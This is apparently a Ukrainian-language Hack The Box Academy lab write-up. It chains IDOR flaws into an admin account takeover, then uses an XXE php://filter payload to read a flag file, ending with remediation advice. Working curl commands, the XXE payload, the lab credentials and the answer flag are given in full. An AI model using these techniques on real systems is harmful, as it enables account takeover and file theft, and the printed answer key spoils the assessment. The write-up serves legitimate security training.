# Web Attacks — Skills Assessment: Chained IDOR + Account Takeover + XXE

Модуль: [Web Attacks](https://academy.hackthebox.com/app/module/134)
Секція: [Skills Assessment](https://academy.hackthebox.com/app/module/134/section/1219)
Ціль: 154.57.164.64:32422
Логін: htb-student / Academy_student!
Відповідь: `HTB{m4573r_w3b_4774ck3r}`

## Концепція

Це фінальний ланцюжок, що об'єднує всі техніки модуля в одну повну атаку: **enum users (IDOR) → token leak (IDOR) → password reset (IDOR write) → account takeover → XXE на привілейованому ендпоінті адміна**. Кожна вразливість сама по собі — "середня", але їх комбінація дає повний контроль над обліковим записом адміністратора і доступ до функціоналу, недоступного звичайним юзерам.

## Крок 1 — Розвідка через Burp: перехоплюємо власну сесію

Відкриваємо Burp Suite (Proxy → Intercept ON), логінимось у браузері як `htb-student`/`Academy_student!`, переглядаємо `/profile.php`. У перехопленому запиті бачимо ключову деталь:

```
Cookie: PHPSESSID=pj908kpn32hh7qp9ai345i2k1o; uid=74
```

Це та сама помилка, що й у попередніх завданнях — `uid` зберігається як **окрема клієнтська cookie**, а не лише в серверній сесії. Переглядаючи `view-source:/settings.php`, знаходимо JS-логіку зміни пароля:

```javascript
fetch(`/api.php/token/${$.cookie("uid")}`)  // бере токен для uid з cookie
fetch(`/reset.php`, {body: `uid=${$.cookie("uid")}&token=${json.token}&password=...`})
```

Обидва запити довіряють клієнтській cookie `uid` без перевірки на сервері — потенційний IDOR у двох місцях одразу.

## Крок 2 — Enum усіх користувачів, пошук адміна

```bash
export url='http://154.57.164.64:32422'
export cookie='PHPSESSID=pj908kpn32hh7qp9ai345i2k1o; uid=74'

for i in $(seq 1 100); do
  curl -s -H "Cookie: $cookie" "$url/api.php/user/$i"
  echo " <- id $i"
done | tee user_data.txt

grep -i "admin" user_data.txt
```

Результат: `{"uid":"52",...,"company":"Administrator"}` — знайдено ціль для account takeover.

## Крок 3 — IDOR №1: вкрадаємо reset-токен адміна

```bash
curl -s -H "Cookie: $cookie" "$url/api.php/token/52"
# {"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
```

Ендпоінт `/api.php/token/{uid}` видає токен скидання пароля для **будь-якого** uid у шляху, не перевіряючи, чи він збігається з uid активної сесії.

## Крок 4 — IDOR №2: змінюємо пароль адміна (з важливим нюансом методу)

```bash
export token='e51a85fa-17ac-11ec-8e51-e78234eb7b0c'

curl -s -G "$url/reset.php" \
  -H "Cookie: $cookie" \
  --data-urlencode 'uid=52' \
  --data-urlencode "token=$token" \
  --data-urlencode 'password=P4ssw0rd123'
# Password changed successfully
```

Ключовий момент, який довелось знайти емпірично: попередні спроби через `-X POST --data` повертали `Access Denied`, бо `reset.php` на цій цілі **приймає параметри як query string (GET), а не POST body** — на відміну від класичного прикладу з `settings.php` в теорії уроку. Це показує, що завжди варто перевіряти обидва варіанти (`-G` vs `-X POST`), якщо перший метод відхиляється — сервер може відрізнятись від очікуваної теоретичної моделі.

## Крок 5 — Логінимось як адмін і забираємо нову сесію

```bash
curl -s -c admin_cookies.txt -X POST "$url/index.php" \
  --data 'username=a.corrales&password=P4ssw0rd123'

cat admin_cookies.txt
# uid=52, PHPSESSID=s3b0vpld7rfv7os7haeb0gq5a0
```

## Крок 6 — Розвідка привілейованого функціоналу

```bash
export admincookie='PHPSESSID=s3b0vpld7rfv7os7haeb0gq5a0; uid=52'

curl -s -b "$admincookie" "$url/profile.php" | grep -iE 'href=|admin|flag|event'
```

Знайдено новий пункт меню, недоступний звичайним юзерам: `<a class="add-event button" href="/event.php">ADD EVENT</a>` — функціонал, специфічний для ролі Administrator.

## Крок 7 — Аналіз форми Add Event: знову XML-driven ендпоінт

```bash
curl -s -b "$admincookie" "$url/event.php" > event_page.html
cat event_page.html
```

Знаходимо в HTML JS-функцію:
```javascript
function XMLFunction() {
  var xml = `<root><name>${...}</name><details>${...}</details><date>${...}</date></root>`;
  fetch(`addEvent.php`, {method: 'POST', body: xml});
}
```

Той самий паттерн, що й у "Entity Services" — сирий XML напряму в тіло POST-запиту без CSRF-токена чи додаткової валідації → знову потенційний XXE, тільки тепер на приватному, адмінському ендпоінті.

## Крок 8 — XXE payload для читання /flag.php

```bash
cat > event_xxe.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
<name>&xxe;</name>
<details>test</details>
<date>2026-01-01</date>
</root>
EOF
```

Той самий надійний трюк з попередніх завдань — `php://filter/convert.base64-encode` не дає PHP виконати `/flag.php`, а замість цього повертає його сирий вихідний код у Base64.

## Крок 9 — Відправка payload на адмінський XXE-ендпоінт

```bash
curl -s -X POST "$url/addEvent.php" \
  -H 'Content-Type: application/xml' \
  -b "$admincookie" \
  --data-binary @event_xxe.xml
```

Результат:
```
Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
```

Поле `<name>` знову виявилось reflected sink — сервер підтвердив створення "події" з назвою, що дорівнює base64-вмісту вкраденого файлу.

## Крок 10 — Декодування флага

```bash
echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
```

Результат:
```php
<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

## Технічна нотатка: PATH env-проблема в Kali

Під час розвідки виникла помилка `curl: command not found` через порожній `$PATH` (ймовірно, після `export PATH=...` в одній з попередніх сесій без збереження стандартних директорій). Виправлено явним відновленням:

```bash
export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
```

Практичний висновок для нотаток: перед будь-якими змінами `$PATH` в bash-сесії краще робити `export PATH="$PATH:/new/dir"` (дописувати), а не перезаписувати змінну повністю — це вбереже від подібних збоїв у довгих pentest-сесіях.

## Повний ланцюжок атаки (для звіту)

```
1. IDOR (user enum)     → знайдено uid=52 = Administrator
2. IDOR (token leak)    → GET /api.php/token/52 → чужий reset-токен без авторизації
3. IDOR (password write)→ GET /reset.php?uid=52&token=...&password=... → зміна пароля адміна
4. Account Takeover     → логін як a.corrales з новим паролем
5. Privilege-gated XXE  → POST /addEvent.php з XML entity → php://filter → читання /flag.php
```

## Чому це працює (root cause для звіту)

- **Опис:** Функціонал скидання пароля (`/api.php/token/{uid}` + `/reset.php`) не перевіряє належність uid до активної сесії на жодному з двох кроків, а адмінський ендпоінт `/addEvent.php` парсить довільний XML без відключення зовнішніх сутностей.
- **Технічні деталі:** Ідентифікатор користувача (`uid`) передається і перевіряється лише через клієнтську cookie, яку легко підмінити; токен скидання пароля видається без прив'язки до сесії запитувача; XML-парсер на `/addEvent.php` успадковує ту саму небезпечну конфігурацію (entity expansion), що й публічна контактна форма.
- **Ризик/Імпакт:** Повний Account Takeover адміністратора без жодних креденшлів + подальший RCE-адjacent доступ (читання будь-яких файлів файлової системи, включно з конфігураційними файлами БД) через привілейований XXE — максимальний імпакт (Critical), що поєднує Broken Access Control (A01) і XML External Entities (A05/CWE-611).
- **Рекомендації:** (1) Прив'язати видачу reset-токена і його використання до `session_id`, а не до значення, що приходить від клієнта; (2) Токени скидання пароля мають бути одноразовими й короткоживучими, ідеально — надсилатись на email, а не повертатись напряму в API-відповіді; (3) Глобально відключити обробку зовнішніх сутностей та DTD у всіх XML-парсерах застосунку, включно з адмінськими ендпоінтами — вразливість не повинна повторюватись в різних частинах коду.
